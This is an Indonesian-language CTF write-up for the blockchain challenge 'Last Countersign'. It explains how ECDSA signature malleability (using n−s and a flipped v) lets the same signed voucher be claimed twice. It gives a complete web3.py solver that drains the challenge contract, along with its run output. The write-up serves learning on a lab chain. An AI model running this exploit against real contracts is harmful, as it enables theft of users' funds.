# Writeup — Last Countersign

## Deskripsi Challenge

Challenge ini berada pada kategori **blockchain** dengan judul **Last Countersign**.

Deskripsi challenge:

```text
When the harbor authority burned, the manifests were sealed and the keys were buried with the clerks. Still, one lamp remains lit above the customs house, waiting for the last countersign.
```

Kita diberikan informasi koneksi:

```text
Chain ID: 31337
RPC: https://rpc-01kyyrgd1ewfn7x6s7rkaxfy6r.u-ctf-ctf-7001b39a.urc.tf/
```

Wallet yang diberikan sudah dalam kondisi unlocked di RPC, sehingga transaksi dapat dikirim langsung menggunakan `transact({"from": PLAYER})` tanpa perlu signing manual dengan private key. Alamat wallet player, private key, dan saldo awal 10 ETH juga diberikan pada halaman challenge.

Contract target:

```text
LastCountersign: 0x62c470bBB019F9e9B33E2D3594879F599FaE91C9
```

---

## Analisis ABI

Dari ABI, contract memiliki beberapa fungsi penting:

```text
currentVoucher()
claim(uint256 amount, uint256 nonce, bytes signature)
isSolved()
redeemed(bytes32)
```

Fungsi `claim()` menerima tiga parameter, yaitu `amount`, `nonce`, dan `signature`. Fungsi ini digunakan untuk melakukan klaim voucher.

Fungsi `currentVoucher()` mengembalikan voucher aktif berupa:

```text
amount
nonce
signature
```

Selain itu, terdapat mapping:

```solidity
redeemed(bytes32) => bool
```

yang digunakan untuk menandai voucher atau ticket yang sudah dipakai.

Dari sini terlihat bahwa challenge menggunakan mekanisme **signed voucher**. Contract memberikan voucher valid melalui `currentVoucher()`, lalu user dapat memanggil `claim()` dengan voucher tersebut.

---

## Percobaan Pertama

Pertama, voucher aktif diambil dari `currentVoucher()`:

```text
amount    = 2500000000000000000
nonce     = 1
signature = 827facd09ace53acb584e61cc34bf6e54def886f4fbaba8f67cd82078b41082f754fd7dc241dac99574909fed71d1a5e8fd7a104fc6cc32a57449a1fb733a6c31b
```

Nilai `amount` tersebut sama dengan:

```text
2.5 ETH
```

Kondisi awal contract:

```text
player balance   : 10 ETH
contract balance : 5 ETH
solved before    : False
```

Kemudian dilakukan klaim pertama dengan voucher asli:

```python
contract.functions.claim(amount, nonce, signature).transact({
    "from": PLAYER,
    "gas": 300000,
})
```

Hasilnya transaksi berhasil:

```text
tx status        : 1
player balance   : 12.499884806484906584 ETH
contract balance : 2.5 ETH
solved after     : False
```

Klaim pertama berhasil menarik 2.5 ETH, tetapi contract masih memiliki 2.5 ETH. Karena `isSolved()` hanya bernilai true ketika contract sudah kosong, challenge belum selesai.

---

## Analisis Vulnerability

Karena voucher asli hanya bisa menarik 2.5 ETH, kita perlu membuat voucher lain yang tetap valid.

Hal menariknya adalah contract menerima parameter `signature` sebagai `bytes`, lalu menggunakan mapping `redeemed(bytes32)` untuk mencegah klaim ulang. Fungsi `redeemed()` menerima parameter `bytes32`, sehingga contract menyimpan suatu identifier voucher atau ticket.

Pada percobaan, setelah klaim pertama:

```text
redeemed original : True
redeemed malleate : False
```

Ini menunjukkan bahwa voucher asli sudah dianggap terpakai, tetapi signature lain yang secara kriptografis masih valid belum dianggap terpakai.

Kelemahan yang dimanfaatkan adalah **ECDSA signature malleability**.

Pada ECDSA, untuk sebuah signature valid `(r, s, v)`, terdapat bentuk lain yang juga valid:

```text
(r, n - s, flipped_v)
```

dengan `n` adalah order kurva secp256k1.

Jika contract hanya memverifikasi hasil `ecrecover()` tetapi tidak memaksa nilai `s` berada pada low-s range, maka dua signature berbeda dapat menghasilkan signer yang sama.

Artinya:

```text
signature asli      valid
signature malleated valid
```

Keduanya merecover address authorizer yang sama, tetapi karena bytes signature-nya berbeda, identifier di mapping `redeemed` juga berbeda.

Akibatnya voucher yang secara logical sama dapat diklaim dua kali.

---

## Membuat Signature Malleated

Signature asli sepanjang 65 byte terdiri dari:

```text
r = signature[0:32]
s = signature[32:64]
v = signature[64]
```

Untuk membuat signature kedua:

```python
s2 = SECP256K1_N - s
v2 = 27 <-> 28
```

Pada challenge ini signature asli berakhiran:

```text
v = 0x1b = 27
```

Maka nilai `v` baru menjadi:

```text
v2 = 0x1c = 28
```

Signature malleated yang dihasilkan:

```text
827facd09ace53acb584e61cc34bf6e54def886f4fbaba8f67cd82078b41082f8ab02823dbe25366a8b6f60128e2e5a02ad73be1b2dbdd11688dc46d19029a7e1c
```

---

## Solver

Solver final:

```python
from web3 import Web3

RPC = "https://rpc-01kyyrgd1ewfn7x6s7rkaxfy6r.u-ctf-ctf-7001b39a.urc.tf/"
PLAYER = Web3.to_checksum_address("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
TARGET = Web3.to_checksum_address("0x62c470bBB019F9e9B33E2D3594879F599FaE91C9")

SECP256K1_N = int(
    "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141",
    16
)

ABI = [
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "currentVoucher",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "nonce",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "signature",
                "type": "bytes"
            }
        ],
        "stateMutability": "pure",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "nonce",
                "type": "uint256"
            },
            {
                "internalType": "bytes",
                "name": "signature",
                "type": "bytes"
            }
        ],
        "name": "claim",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "",
                "type": "bytes32"
            }
        ],
        "name": "redeemed",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]


def malleate_signature(sig: bytes) -> bytes:
    assert len(sig) == 65

    r = sig[:32]
    s = int.from_bytes(sig[32:64], "big")
    v = sig[64]

    if v in (0, 1):
        v2 = 1 - v
    elif v in (27, 28):
        v2 = 55 - v
    else:
        raise ValueError(f"unexpected v: {v}")

    s2 = SECP256K1_N - s
    return r + s2.to_bytes(32, "big") + bytes([v2])


w3 = Web3(Web3.HTTPProvider(RPC))
contract = w3.eth.contract(address=TARGET, abi=ABI)

amount, nonce, sig = contract.functions.currentVoucher().call()
sig = bytes(sig)
sig2 = malleate_signature(sig)

print("[*] chain id         :", w3.eth.chain_id)
print("[*] player           :", PLAYER)
print("[*] target           :", TARGET)
print("[*] player balance   :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] contract balance :", w3.from_wei(w3.eth.get_balance(TARGET), "ether"), "ETH")
print("[*] solved before    :", contract.functions.isSolved().call())
print("[*] amount           :", amount, "=", w3.from_wei(amount, "ether"), "ETH")
print("[*] nonce            :", nonce)
print("[*] original sig     :", sig.hex())
print("[*] malleated sig    :", sig2.hex())

ticket1 = w3.keccak(sig)
ticket2 = w3.keccak(sig2)

print("[*] redeemed original:", contract.functions.redeemed(ticket1).call())
print("[*] redeemed malleate:", contract.functions.redeemed(ticket2).call())

if not contract.functions.redeemed(ticket1).call():
    print("[*] claiming original voucher...")
    tx = contract.functions.claim(amount, nonce, sig).transact({
        "from": PLAYER,
        "gas": 300000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] original tx      :", receipt.transactionHash.hex())
    print("[+] status           :", receipt.status)

if not contract.functions.redeemed(ticket2).call() and w3.eth.get_balance(TARGET) > 0:
    print("[*] claiming malleated voucher...")
    tx = contract.functions.claim(amount, nonce, sig2).transact({
        "from": PLAYER,
        "gas": 300000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] malleated tx     :", receipt.transactionHash.hex())
    print("[+] status           :", receipt.status)

print("[*] player balance   :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] contract balance :", w3.from_wei(w3.eth.get_balance(TARGET), "ether"), "ETH")
print("[*] solved after     :", contract.functions.isSolved().call())
```

---

## Output

Karena voucher asli sudah diklaim pada percobaan sebelumnya, script langsung melakukan klaim kedua menggunakan signature malleated:

```text
[*] chain id         : 31337
[*] player           : 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[*] target           : 0x62c470bBB019F9e9B33E2D3594879F599FaE91C9
[*] player balance   : 12.499884806484906584 ETH
[*] contract balance : 2.5 ETH
[*] solved before    : False
[*] amount           : 2500000000000000000 = 2.5 ETH
[*] nonce            : 1
[*] original sig     : 827facd09ace53acb584e61cc34bf6e54def886f4fbaba8f67cd82078b41082f754fd7dc241dac99574909fed71d1a5e8fd7a104fc6cc32a57449a1fb733a6c31b
[*] malleated sig    : 827facd09ace53acb584e61cc34bf6e54def886f4fbaba8f67cd82078b41082f8ab02823dbe25366a8b6f60128e2e5a02ad73be1b2dbdd11688dc46d19029a7e1c
[*] redeemed original: True
[*] redeemed malleate: False
[*] claiming malleated voucher...
[+] malleated tx     : 3fc07cb5ecc7584d1e3c1b33db380907071d5594e7f864e477b92b26d0457ada
[+] status           : 1
[*] player balance   : 14.999776334872333572 ETH
[*] contract balance : 0 ETH
[*] solved after     : True
```

Setelah klaim kedua, contract balance menjadi:

```text
0 ETH
```

dan fungsi `isSolved()` mengembalikan:

```text
True
```

---

## Flag

Challenge berhasil diselesaikan setelah `isSolved()` bernilai `true`.

Flag didapat dari halaman challenge setelah tombol solve diklik.

---
